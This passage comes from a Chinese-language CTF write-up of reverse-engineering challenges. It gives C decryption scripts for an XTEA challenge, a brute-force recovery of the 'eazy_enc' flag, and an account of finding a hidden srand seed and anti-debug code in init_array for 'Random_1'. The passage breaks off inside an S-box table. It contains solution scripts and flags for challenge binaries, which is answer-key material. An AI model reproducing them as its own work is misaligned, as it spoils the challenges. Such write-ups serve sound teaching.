class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">XTEA_decryot</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">999999999</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">1</span> + delta * <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">3</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">3</span>) ^ (v1 &gt;&gt; <span class="number">4</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v4[] = &#123;</span><br><span class="line">            <span class="number">130</span>, <span class="number">67</span>, <span class="number">163</span>, <span class="number">137</span>, <span class="number">111</span>, <span class="number">186</span>, <span class="number">128</span>, <span class="number">200</span>, <span class="number">248</span>, <span class="number">180</span>,</span><br><span class="line">            <span class="number">86</span>, <span class="number">189</span>, <span class="number">179</span>, <span class="number">65</span>, <span class="number">178</span>, <span class="number">141</span>, <span class="number">218</span>, <span class="number">68</span>, <span class="number">14</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">3</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">222</span>, <span class="number">18</span>, <span class="number">84</span>, <span class="number">173</span>, <span class="number">137</span>, <span class="number">149</span>, <span class="number">48</span>,</span><br><span class="line">            <span class="number">99</span>, <span class="number">33</span>, <span class="number">223</span>, <span class="number">13</span>, <span class="number">148</span>, <span class="number">17</span>, <span class="number">220</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> *v4p = (<span class="type">uint32_t</span> *) v4;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key[] = &#123;</span><br><span class="line">            <span class="number">276</span>, <span class="number">1300</span>, <span class="number">6425</span>, <span class="number">2064</span></span><br><span class="line">    &#125;;</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">4</span> * key[<span class="number">0</span>];</span><br><span class="line">    key[<span class="number">2</span>] = (key[<span class="number">1</span>] &gt;&gt; <span class="number">1</span>) + <span class="number">3</span>;</span><br><span class="line">    key[<span class="number">3</span>] = (key[<span class="number">2</span>] ^ key[<span class="number">1</span>] ^ key[<span class="number">0</span>]) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) &#123;</span><br><span class="line">        XTEA_decryot(&amp;v4p[<span class="number">2</span> * i], key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n&quot;</span>, (<span class="type">char</span> *) v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025184837381.png" alt="image-20231025184837381" style="zoom:50%;" /><p>结束…</p><h2 id="eazy-enc">eazy_enc</h2><p>使用了一个函数指针数组来进行多次加密:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025185205159.png" alt="image-20231025185205159"></p><p>分别分析4个加密函数,最终决定对flag的每一个字符进行爆破,保持加密函数逻辑不变,对爆破的字符进行加密,最后检查是否匹配.</p><p>实际上后来发现上面的4个加密函数执行后,密文和明文并不是一一对应的(单射?),原因可能在于第四个加密中的<code>*=52</code>这个操作会有溢出,导致回绕:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025185608304.png" alt="image-20231025185608304" style="zoom:50%;" /><p>实际可能不止这一处,懒得分析了(数学不太行),总之就是要把每一个可行的字符都输出来,尝试肉眼进行匹配(flag长度并不长,并且接近是一段英语).</p><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">caesar</span><span class="params">(<span class="type">int</span> before_c, <span class="type">int</span> offset)</span> &#123;</span><br><span class="line">    <span class="type">int</span> c = before_c;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(c)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (offset &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            offset += <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">            offset += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">islower</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span> + (c - <span class="string">&#x27;a&#x27;</span>) % <span class="number">26</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isupper</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span> + (c - <span class="string">&#x27;A&#x27;</span>) % <span class="number">26</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> + (c - <span class="string">&#x27;0&#x27;</span>) % <span class="number">10</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> (c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">caesar2</span><span class="params">(<span class="type">int</span> before_c, <span class="type">int</span> offset, <span class="type">int</span> mod_num, <span class="type">int</span> base)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (before_c + offset) % mod_num + base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    enc[<span class="number">0</span>] = <span class="number">-24</span>;</span><br><span class="line">    enc[<span class="number">1</span>] = <span class="number">0x80</span>;</span><br><span class="line">    enc[<span class="number">2</span>] = <span class="number">-124</span>;</span><br><span class="line">    enc[<span class="number">3</span>] = <span class="number">8</span>;</span><br><span class="line">    enc[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)&amp;enc[<span class="number">5</span>], <span class="string">&quot;&lt;xh&quot;</span>);</span><br><span class="line">    enc[<span class="number">9</span>] = <span class="number">112</span>;</span><br><span class="line">    enc[<span class="number">10</span>] = <span class="number">124</span>;</span><br><span class="line">    enc[<span class="number">11</span>] = <span class="number">-108</span>;</span><br><span class="line">    enc[<span class="number">12</span>] = <span class="number">-56</span>;</span><br><span class="line">    enc[<span class="number">13</span>] = <span class="number">-32</span>;</span><br><span class="line">    enc[<span class="number">14</span>] = <span class="number">16</span>;</span><br><span class="line">    enc[<span class="number">15</span>] = <span class="number">-20</span>;</span><br><span class="line">    enc[<span class="number">16</span>] = <span class="number">-76</span>;</span><br><span class="line">    enc[<span class="number">17</span>] = <span class="number">-84</span>;</span><br><span class="line">    enc[<span class="number">18</span>] = <span class="number">104</span>;</span><br><span class="line">    enc[<span class="number">19</span>] = <span class="number">-88</span>;</span><br><span class="line">    enc[<span class="number">20</span>] = <span class="number">12</span>;</span><br><span class="line">    enc[<span class="number">21</span>] = <span class="number">28</span>;</span><br><span class="line">    enc[<span class="number">22</span>] = <span class="number">-112</span>;</span><br><span class="line">    enc[<span class="number">23</span>] = <span class="number">-52</span>;</span><br><span class="line">    enc[<span class="number">24</span>] = <span class="number">84</span>;</span><br><span class="line">    enc[<span class="number">25</span>] = <span class="number">60</span>;</span><br><span class="line">    enc[<span class="number">26</span>] = <span class="number">20</span>;</span><br><span class="line">    enc[<span class="number">27</span>] = <span class="number">-36</span>;</span><br><span class="line">    enc[<span class="number">28</span>] = <span class="number">48</span>;</span><br><span class="line">    enc[<span class="number">29</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">29</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;NewStarCTF&quot;</span>;</span><br><span class="line">    <span class="type">int</span> key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key_len = %d\n&quot;</span>,key_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc is:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dec[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> chr = <span class="number">0</span>; chr &lt;= <span class="number">128</span>; ++chr) &#123;</span><br><span class="line">            dec[i] = chr;</span><br><span class="line"></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> temp = dec[i];</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isupper</span>(temp))</span><br><span class="line">                temp = caesar2(temp, <span class="number">-52</span>, <span class="number">26</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">islower</span>(temp))</span><br><span class="line">                temp = caesar2(temp, <span class="number">-89</span>, <span class="number">26</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(temp))</span><br><span class="line">                temp = caesar2(temp, <span class="number">-45</span>, <span class="number">10</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            dec[i] = temp;</span><br><span class="line"></span><br><span class="line">            dec[i] += key[i % key_len];</span><br><span class="line">            dec[i] = ~(dec[i]);</span><br><span class="line">            dec[i] *= <span class="number">52</span>;</span><br><span class="line">            <span class="keyword">if</span> (dec[i] == enc[i] &amp;&amp; chr&gt;=<span class="number">30</span> &amp;&amp; chr&lt;=<span class="number">128</span>) &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(chr);</span><br><span class="line">                <span class="comment">// break; // 这里的break;注释掉,以确保所有的匹配项都输出来</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(dec[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        暴力结果:</span></span><br><span class="line"><span class="comment">        B    B</span></span><br><span class="line"><span class="comment">        :r   r</span></span><br><span class="line"><span class="comment">        #u   u</span></span><br><span class="line"><span class="comment">        &quot;t   t</span></span><br><span class="line"><span class="comment">        -e   e</span></span><br><span class="line"><span class="comment">        F    F</span></span><br><span class="line"><span class="comment">        4o   4 o</span></span><br><span class="line"><span class="comment">        :r   r</span></span><br><span class="line"><span class="comment">        +c   c</span></span><br><span class="line"><span class="comment">        -e   e</span></span><br><span class="line"><span class="comment">        I    I</span></span><br><span class="line"><span class="comment">        !s   s</span></span><br><span class="line"><span class="comment">        A    A</span></span><br><span class="line"><span class="comment">        G    G</span></span><br><span class="line"><span class="comment">        4o   o</span></span><br><span class="line"><span class="comment">        4o   o</span></span><br><span class="line"><span class="comment">        ,d   d</span></span><br><span class="line"><span class="comment">        %w   w</span></span><br><span class="line"><span class="comment">        )a   a</span></span><br><span class="line"><span class="comment">        &#x27;y   y</span></span><br><span class="line"><span class="comment">        &quot;t   t</span></span><br><span class="line"><span class="comment">        4o   o</span></span><br><span class="line"><span class="comment">        G    G</span></span><br><span class="line"><span class="comment">        -e   e</span></span><br><span class="line"><span class="comment">        &quot;t   t</span></span><br><span class="line"><span class="comment">        F    F</span></span><br><span class="line"><span class="comment">        1l   l</span></span><br><span class="line"><span class="comment">        )a   a</span></span><br><span class="line"><span class="comment">        /g   g</span></span><br><span class="line"><span class="comment">        可知并不是一一映射的关系,可能有多解:</span></span><br><span class="line"><span class="comment">        整理猜测得出:(正解为第二个)</span></span><br><span class="line"><span class="comment">        BruteF4rceIsAGoodwaytoGetFlag</span></span><br><span class="line"><span class="comment">        BruteForceIsAGoodwaytoGetFlag</span></span><br><span class="line"><span class="comment">        即flag&#123;BruteForceIsAGoodwaytoGetFlag&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag简单地猜测即可得出.</p><h2 id="random-1">Random_1</h2><p>多余的话不说,main函数都能分析明白,关键就是找到这个伪随机的种子.</p><p>我们确定了程序的平台,编译环境,那么理论上我们只需要找到固定的随机数种子就能生成相同的伪随机数序列,进而实现解密,但是这个seed不好找…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/491d18626b30bcf14b6f8c49c2ee9a61.png" alt="491d18626b30bcf14b6f8c49c2ee9a61"></p><p>由于题解在很久之后才写,所以这里主要记录一下之前做的时候的一些过程思路,实际思考过程并不是像这篇题解这样的.</p><p>实际上我们从导入表进行交叉引用,慢慢找就能找到关键函数.</p><p>尝试了动调获取seed失败,我们能够知道这个程序是有反调试手段的,那么从这个角度出发,我们如果能找到反调试的部分在哪里,也许就能顺藤摸瓜找到seed这个种子究竟在哪里设置的.</p><p>经过分析某个该死的函数的IDA图形化交叉引用视图,这里忘了是哪个了,当时应该就是从那个<code>_srand()</code>函数出发的…</p><p>我们可以发现这个程序的反调试的手段在这个<code>_Z1av</code>指向的函数中:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/df3c1046e922e0563bb806abeaa1448e.png" alt="df3c1046e922e0563bb806abeaa1448e"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/7aff7b3313843ae0b4cbaf253569a99b.png" alt="7aff7b3313843ae0b4cbaf253569a99b"></p><p>我没记错的话这个a()函数就是<code>_Z1av</code>指向的函数(忘记了)</p><p>实际上就是从这里的这个函数进行依次调用的:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/df270215e2f8857ce183f1ffd817a8af.png" alt="df270215e2f8857ce183f1ffd817a8af"></p><p>依次调用了这个函数指针数组中保存的一系列函数,我们跟进去看就是前图那两个<code>_Z1av</code>和<code>_Z1bv</code>,虽然不知道为什么起这么个名字.</p><p>实际上这里看到我们要找的关键函数在<code>__init_array_start</code>中,这里就涉及到<code>init_array段</code>了,其中的函数调用早于main()函数,所以我们一下子找不到这个函数,但是他们确确实实地运行了,同样的还有<code>fini_array段</code>,其中的部分是在程序结束时执行的.</p><p>那么再往后看,第二个<code>_Z1bv</code>指向的函数同样跟进去一看,就发现这个函数里有种子了(记得这个就是对应着<code>_Z1bv</code>):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/c394bd16e43361f9a0c1604cb0a5a53d.png" alt="c394bd16e43361f9a0c1604cb0a5a53d"></p><p>那么种子有了,其他部分的加密很简单,直接写脚本就好,一定要在同样的环境下跑—Ubuntu22下运行</p><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//在ubuntu22下运行</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s2[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *p = (<span class="type">long</span> <span class="type">long</span> *) s2;</span><br><span class="line">    p[<span class="number">0</span>] = <span class="number">0x3513AB8AB2D7E6EE</span>LL;</span><br><span class="line">    p[<span class="number">1</span>] = <span class="number">0x2EEDBA9CB9C97B02</span>LL;</span><br><span class="line">    p[<span class="number">2</span>] = <span class="number">0x16E4F8C8EEFA4FBD</span>LL;</span><br><span class="line">    p[<span class="number">3</span>] = <span class="number">0x383014F4983B6382</span>LL;</span><br><span class="line">    p[<span class="number">4</span>] = <span class="number">0xEA32360C3D843607</span>LL;</span><br><span class="line">    p[<span class="number">5</span>] = <span class="number">42581LL</span>;</span><br><span class="line">    p[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Table[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">48</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">103</span>, <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>,</span><br><span class="line">                    <span class="number">250</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>,</span><br><span class="line">                    <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>,</span><br><span class="line">                    <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">199</span>,</span><br><span class="line">                    <span class="number">35</span>, <span class="number">195</span>, <span class="number">24</span>, <span class="number">150</span>, <span class="number">5</span>, <span class="number">154</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>,</span><br><span class="line">                    <span class="number">235</span>, <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">131</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">110</span>,</span><br><span class="line">                    <span class="number">90</span>, <span class="number">160</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">41</span>, <span class="number">227</span>, <span class="number">47</span>, <span class="number">132</span>,</span><br><span class="line">                    <span class="number">83</span>, <span class="number">209</span>, <span class="number">0</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>,</span><br><span class="line">                    <span class="number">190</span>, <span class="number">57</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>,</span><br><span class="line">                    <span class="number">67</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">69</span>, <span class="number">249</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">80</span>, <span class="number">60</span>,</span><br><span class="line">                    <span class="number">159</span>, <span class="number">168</span>, <span class="number">81</span>, <span class="number">163</span>, <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>, <span class="number">56</span>, <span class="number">245</span>,</span><br><span class="line">                    <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>, <span class="number">12</span>,</span><br><span class="line">                    <span class="number">19</span>, <span class="number">236</span>, <span class="number">95</span>, <span class="number">151</span>, <span class="number">68</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>, <span class="number">61</span>,</span><br><span class="line">                    <span class="number">100</span>, <span class="number">93</span>, <span class="number">25</span>, <span class="number">115</span>, <span class="number">96</span>, <span class="number">129</span>, <span class="number">79</span>, <span class="number">220</span>, <span class="number">34</span>, <span class="number">42</span>,</span><br><span class="line">                    <span class="number">144</span>, <span class="number">136</span>, <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">94</span>, <span class="number">11</span>, <span class="number">219</span>,</span><br><span class="line">                    <span class="number">224</span>, <span class="number">50</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">73</span>, <span class="number">6</span>, <span class="number">36</span>, <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>,</span><br><span class="line">                    <span class="number">172</span>, <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>, <span class="number">55</span>, <span class="number">109</span>,</span><br><span class="line">                    <span class="number">141</span>, <span class="number">213</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>,</span><br><span class="line">                    <span class="number">174</span>, <span class="number">8</span>, <span class="number">186</span>, 